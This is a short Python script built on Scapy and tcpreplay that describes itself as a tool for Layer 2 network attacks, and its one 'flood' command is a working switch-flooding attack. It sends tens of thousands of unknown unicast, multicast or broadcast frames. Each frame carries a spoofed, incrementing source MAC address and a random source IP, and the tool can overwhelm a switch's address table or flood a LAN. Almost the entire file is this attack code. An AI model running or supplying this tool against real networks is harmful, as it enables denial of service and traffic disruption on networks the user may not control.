#!/usr/bin/python3

# Requirements: Scapy for Python3 - apt-get install python3-scapy
# 		tcpreplay - apt-get install tcpreplay

import argparse
from scapy.all import *

# create parser
main_parser = argparse.ArgumentParser(description='Execute various Layer 2 network attacks.')

subparsers = main_parser.add_subparsers(dest='action')

flood_parser = subparsers.add_parser('flood',help='Flood packages')

main_parser.add_argument("-v","--verbose", help="Increase output verbosity",action="store_true")
main_parser.add_argument("-i","--interface", help="Network Interface",default="ens33")

flood_parser.add_argument("-t","--floodtype",help="Flood type", choices =["unknown_unicast","unknown_multicast","unknown_broadcast"], required=True)
flood_parser.add_argument("-c","--packetcount",help="Amount of packets", default=60000,type=int)
flood_parser.add_argument("-d","--destinationip",help="Destination IP Address",default="0.0.0.0")
flood_parser.add_argument("-dmac","--destinationmac",help="Destination MAC Address",default="00:01:02:03:04:05")

main_args = main_parser.parse_args()
action = main_args.action



def l2_flood(floodtype,iface=main_args.interface):
    ttl=10
    if floodtype == "unknown_multicast":
       print("Generating",main_args.packetcount,"multicast flood packets")
       base_mac_int = int.from_bytes(b'\x04\x00\x00\x00\x00\x00', 'big')
       if main_args.destinationip=="0.0.0.0":
          dstip = "224.0.0.0"
       dst_mac = "11:22:33:44:55:66"
       ttl=1


    if floodtype == "unknown_unicast":
       print("Generating",main_args.packetcount,"unicast flood packets")
       base_mac_int = int.from_bytes(b'\x04\x00\x00\x00\x00\x00', 'big')
       dstip = main_args.destinationip
       if main_args.destinationmac == "00:01:02:03:04:05":
          dst_mac = "10:22:33:44:55:66"

    if floodtype == "unknown_broadcast":
       print("Generating",main_args.packetcount,"broadcast flood packets")
       base_mac_int = int.from_bytes(b'\x08\x00\x00\x00\x00\x00', 'big')
       dstip = main_args.destinationip
       if main_args.destinationip=="0.0.0.0":
          dstip = "255.255.255.255"
       if main_args.destinationmac == "00:01:02:03:04:05":
          dst_mac = "FF:FF:FF:FF:FF:FF"



    # generate packets in memory
    packet_list = []

    for i in range(1, main_args.packetcount):
        src_mac = ':'.join('%02x' % byte for byte in (base_mac_int + i).to_bytes(6, 'big')) # Iterate over source mac address, add one each loop
        frame = Ether(src=src_mac, dst=dst_mac) / IP(dst=dstip, src=RandIP(), ttl=ttl) / ICMP()
        packet_list.append(frame)

    print("Sending packets...",end="")
    sendpfast(packet_list, iface=iface)
    print("Done")




if action=="flood":
   l2_flood(floodtype=main_args.floodtype)
